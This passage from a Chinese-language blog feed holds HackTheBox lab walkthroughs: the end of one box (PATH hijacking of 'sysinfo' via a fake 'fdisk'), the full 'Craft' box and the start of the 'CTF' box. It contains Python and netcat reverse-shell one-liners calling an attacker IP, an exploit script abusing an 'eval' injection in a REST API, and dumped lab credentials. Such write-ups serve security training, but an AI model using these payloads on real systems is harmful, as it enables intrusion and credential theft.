class="line">&#x2F;0&#x2F;1&#x2F;1                         memory     16KiB L1 cache</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.5                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.6                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;17.7                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18                      bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.1                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.2                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.3                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.4                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.5                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.6                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;100&#x2F;18.7                    bridge     PCI Express Root Port</span><br><span class="line">&#x2F;0&#x2F;46              scsi0       storage    </span><br><span class="line">&#x2F;0&#x2F;46&#x2F;0.0.0        &#x2F;dev&#x2F;cdrom  disk       VMware IDE CDR00</span><br><span class="line">&#x2F;1                             system     </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Disk &#x2F;dev&#x2F;loop0: 3.7 MiB, 3825664 bytes, 7472 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk &#x2F;dev&#x2F;loop1: 54.5 MiB, 57151488 bytes, 111624 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk &#x2F;dev&#x2F;loop11: 3.7 MiB, 3862528 bytes, 7544 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">processor	: 0</span><br><span class="line">vendor_id	: AuthenticAMD</span><br><span class="line">cpu family	: 23</span><br><span class="line">model		: 1</span><br><span class="line">model name	: AMD EPYC 7401P 24-Core Processor</span><br><span class="line">stepping	: 2</span><br><span class="line">microcode	: 0x8001230</span><br><span class="line">cpuid level	: 13</span><br><span class="line">wp		: yes</span><br><span class="line">flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor</span><br><span class="line">bugs		: fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass</span><br><span class="line">bogomips	: 4000.00</span><br><span class="line">TLB size	: 2560 4K pages</span><br><span class="line">clflush size	: 64</span><br><span class="line">cache_alignment	: 64</span><br><span class="line">address sizes	: 43 bits physical, 48 bits virtual</span><br><span class="line">power management:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           3.8G        566M        2.4G        4.0M        929M        3.1G</span><br><span class="line">Swap:          947M          0B        947M</span><br></pre></td></tr></table></figure>
<p>sysinfo显示出来的内容主要分为四个部分</p>
<ul>
<li>Hardware Info</li>
<li>Disk Info</li>
<li>CPU Info</li>
<li>Mem Usage</li>
</ul>
<p>查阅了Forum上前辈们给的提示，发现<code>sysinfo</code>是四个Linux命令的组合调用：</p>
<ul>
<li>Hardware Info = <code>lshw -short</code></li>
<li>Disk Info = <code>fdisk -l</code></li>
<li>CPU Info = <code>cat /proc/cpuinfo</code></li>
<li>Mem Usage = <code>free -h</code></li>
</ul>
<p>既然<code>sysinfo</code>调用的是原生的Linux命令，那么我们就可以通过改变<code>PATH</code>变量，创建一个内容由自己决定，文件名为上面四种任意一个的“二进制文件”，具体而言：</p>
<p>在<code>/tmp/magic</code>目录下创建一个<code>fdisk</code>文件，然后向其中写入reverse shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ touch fdisk</span><br><span class="line">touch fdisk</span><br><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ echo python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk</span><br><span class="line">&lt;(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk</span><br></pre></td></tr></table></figure>
<p>更改权限755</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ chmod fdisk 755</span><br></pre></td></tr></table></figure>
<p>然后将<code>/tmp/magic</code>目录写到<code>PATH</code>环境变量中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:&#x2F;tmp&#x2F;magic$ export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH</span><br></pre></td></tr></table></figure>
<blockquote>
<p>更详细的解释可以看这篇文章：<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
</blockquote>
<p>这样就达到了目的，即<code>sysinfo</code>会去执行<code>/tmp/magic</code>目录下的<code>fdisk</code></p>
<p>本机监听1234端口，靶机运行<code>sysinfo</code>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ncat: Connection from 10.10.10.185:45410.</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">root@ubuntu:&#x2F;tmp# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<ul>
<li>利用SQL Injection登录上传图片页面</li>
<li>使用exiftool工具向正常图片添加web shell</li>
<li>上传图片获得<code>www-data</code>的reverse shell</li>
<li>从<code>db.php5</code>获得MySQL数据库的登录名和密码</li>
<li>使用<code>mysqldump</code>备份数据库，得到网站的admin密码，即用户<code>theseus</code>的su密码</li>
<li>分析<code>sysinfo</code>的输出信息</li>
<li>使用<code>PATH</code>变量提权</li>
</ul>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Craft-walkthrough</title>
    <url>/Target_drone/HackTheBox/16.HTB-Craft-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Craft-Walkthrough">HTB::Craft Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503114541.png" style="zoom: 80%;" />
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>REST API</li>
<li>Git commit history</li>
<li>Vault OTP</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Inital-Enumeration">Inital Enumeration</h3>
<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -A -Pn -T4 -p- 10.10.10.110</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-01 21:42 EDT</span><br><span class="line">Nmap scan report for 10.10.10.110</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65462 closed ports, 70 filtered ports</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)</span><br><span class="line">|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)</span><br><span class="line">|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)</span><br><span class="line">443&#x2F;tcp  open  ssl&#x2F;http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx&#x2F;1.15.8</span><br><span class="line">|_http-title: About</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US</span><br><span class="line">| Not valid before: 2019-02-06T02:25:47</span><br><span class="line">|_Not valid after:  2020-06-20T02:25:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">6022&#x2F;tcp open  ssh      (protocol 2.0)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    SSH-2.0-Go</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port6022-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;5&#x2F;1%Time&#x3D;5EACD7D6%P&#x3D;x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,C,&quot;SSH-2\.0-Go\r\n&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2030.05 seconds</span><br></pre></td></tr></table></figure>
<p>主要考察443端口站点</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115042.png"  />
<p>导航栏有两个网页链接：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav pull-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://api.craft.htb/api/&quot;</span>&gt;</span>API<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://gogs.craft.htb/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Git&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/Git-Icon-Black.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;20&quot;</span> <span class="attr">height</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把<code>api.craft.htb</code>和<code>gogs.craft.htb</code>加到<code>/etc/hosts</code>文件中，再访问：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115250.png" alt=""></p>
<p>发现是一个REST API接口Swagger文档，单独的一个API文档没有什么利用价值，再去看看<code>gogs.craft.htb</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115509.png" alt=""></p>
<p>发现是一个类似GitHub的代码托管平台，里面有443端口站点的源代码，来看看commit提交历史：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115623.png" alt=""></p>
<p>主要看编号为 <code>c414b16057</code> and <code>10e3ba4f0a</code>这两个commits，其中<code>c414b16057</code> 代码执行漏洞：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -38,9 +38,13 @@ class BrewCollection(Resource):</span></span><br><span class="line">         <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         Creates a new brew entry.</span></span><br><span class="line"><span class="string">         &quot;&quot;&quot;</span></span><br><span class="line">-</span><br><span class="line">-        create_brew(request.json)</span><br><span class="line">-        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line">+</span><br><span class="line">+        <span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line">+        <span class="keyword">if</span> eval(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br><span class="line">+            <span class="keyword">return</span> <span class="string">&quot;ABV must be a decimal value less than 1.0&quot;</span>, <span class="number">400</span></span><br><span class="line">+        <span class="keyword">else</span>:</span><br><span class="line">+            create_brew(request.json)</span><br><span class="line">+            <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line"><span class="meta"> @ns.route(&#x27;/&lt;int:id&gt;&#x27;)</span></span><br><span class="line"><span class="meta"> @api.response(404, &#x27;Brew not found.&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><code>10e3ba4f0a</code>有一处代码泄露：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">+json_response = json.loads(response.text)</span><br><span class="line">+token =  json_response[<span class="string">&#x27;token&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>利用思路：用凭证<code>dinesh: 4aUh0A8PbVJxgd</code>登录<code>api.craft.htb/api/auth/login</code>，然后再利用代码执行漏洞写入反弹shell，show code：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token =  json_response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123; <span class="string">&#x27;X-Craft-API-Token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure token is valid</span></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/check&#x27;</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Create bogus ABV brew&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.43 1234 &gt;/tmp/f&#x27;)&quot;</span></span><br><span class="line">brew_dict = &#123;&#125;</span><br><span class="line">brew_dict[<span class="string">&#x27;abv&#x27;</span>] = payload + <span class="string">&#x27;| 0.15&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;brewer&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;style&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">json_data = json.dumps(brew_dict)</span><br><span class="line">response = requests.post(<span class="string">&#x27;https://api.craft.htb/api/brew/&#x27;</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>主机监听1234端口，成功反弹shell。</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;app # cd &#x2F;</span><br><span class="line">&#x2F; # ls -la</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..</span><br><span class="line">-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin</span><br><span class="line">drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 home</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib</span><br><span class="line">drwxr-xr-x    5 root     root          4096 Jan 30  2019 media</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt</span><br><span class="line">dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc</span><br><span class="line">drwx------    1 root     root          4096 Jan  3 15:16 root</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 run</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv</span><br><span class="line">dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys</span><br><span class="line">drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan 30  2019 var</span><br><span class="line">&#x2F; #</span><br></pre></td></tr></table></figure>
<p>结果发现并没有拿到靶机的shell，而是一个docker镜像的shell。</p>
<p>发现在项目的主目录<code>/opt/app</code>有一个<code>dbtest.py</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import pymysql</span><br><span class="line">from craft_api import settings</span><br><span class="line"></span><br><span class="line"># test connection to mysql database</span><br><span class="line"></span><br><span class="line">connection &#x3D; pymysql.connect(host&#x3D;settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user&#x3D;settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password&#x3D;settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db&#x3D;settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass&#x3D;pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line">try: </span><br><span class="line">    with connection.cursor() as cursor:</span><br><span class="line">        sql &#x3D; &quot;SELECT &#96;id&#96;, &#96;brewer&#96;, &#96;name&#96;, &#96;abv&#96; FROM &#96;brew&#96; LIMIT 1&quot;</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result &#x3D; cursor.fetchone()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此时mysql命令同样不能使用。</p>
</blockquote>
<p>但是，我们从gogs仓库的代码中，得知数据库中应该有两张表：<code>brew</code>和<code>user</code>，那么就可以模仿<code>dbtest.py</code>重新写一个查询语句dump所有的用户：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># test connection to mysql database</span></span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">&quot;SELECT `username`, `password` FROM `user`&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>
<p>所有用户：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;username&#x27;: &#x27;dinesh&#x27;, &#x27;password&#x27;: &#x27;4aUh0A8PbVJxgd&#x27;&#125;, </span><br><span class="line">&#123;&#x27;username&#x27;: &#x27;ebachman&#x27;, &#x27;password&#x27;: &#x27;llJ77D8QFkLPQB&#x27;&#125;, </span><br><span class="line">&#123;&#x27;username&#x27;: &#x27;gilfoyle&#x27;, &#x27;password&#x27;: &#x27;ZEU3N8WNM2rh4T&#x27;&#125;</span><br></pre></td></tr></table></figure>
<p>经过尝试，这几个密码并不是SSH的登录密码，实在没思路了去看了一眼Writeup，<code>gilfoyle</code>有一个私有仓库<code>craft-infra</code>，并且仓库代码中泄露了SSH的private key：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503141140.png" alt=""></p>
<p>并且这个private key有密码保护，但是这个密码和<code>gilfoyle</code>的gogs密码相同：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503141425.png" alt=""></p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>用户的主目录下有一个<code>.vault_key</code>文件，Google一下</p>
<blockquote>
<p>Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API.</p>
</blockquote>
<p>根据https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords这篇文档，再结合<code>craft-infra</code>仓库中有一个文件夹<code>vault</code>中的<code>secrets.sh</code>文件，可以使用vault命令登录SSH：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1</span><br><span class="line">Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed</span><br><span class="line">below. Enter this code in the SSH password prompt. If you install sshpass,</span><br><span class="line">Vault can automatically perform this step for you.</span><br><span class="line">OTP for the session is: a66d769f-f1e3-e3bd-9b52-2cfb7edcd85b</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这样说起来提权过程好像比较简短，但是做起来要花不少的功夫。</p>
</blockquote>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::CTF_walkthrough</title>
    <url>/Target_drone/HackTheBox/17.HTB-CTF-walkthrough/</url>
    <content><![CDATA[<h1 id="HackTheBox-CTF-Walkthrough">HackTheBox::CTF Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<table>
<thead>
<tr>
<th>Column</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td>Name</td>
<td>CTF</td>
</tr>
<tr>
<td>IP</td>
<td>10.10.10.122</td>
</tr>
<tr>
<td>Points</td>
<td>50</td>
</tr>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Insane</td>
</tr>
<tr>
<td>Creator</td>
<td>0xEA31</td>
</tr>
</tbody>
</table>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>Python Scripting</li>
<li>LDAP Injection</li>
<li>Wildcard and Symlink abuse</li>
</ul>
<h2 id="0x03-Initial-Enumeration">0x03 Initial Enumeration</h2>
<p>Nmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure>
<p>查看80端口</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p>
<p>大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。</p>
<p>再去登录界面看一下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p>
<p>提示我们是一个OTP，及One Time Password，一般而言是1分钟更新一次。</p>
<p>查看源码，发现有一个Hint</p>
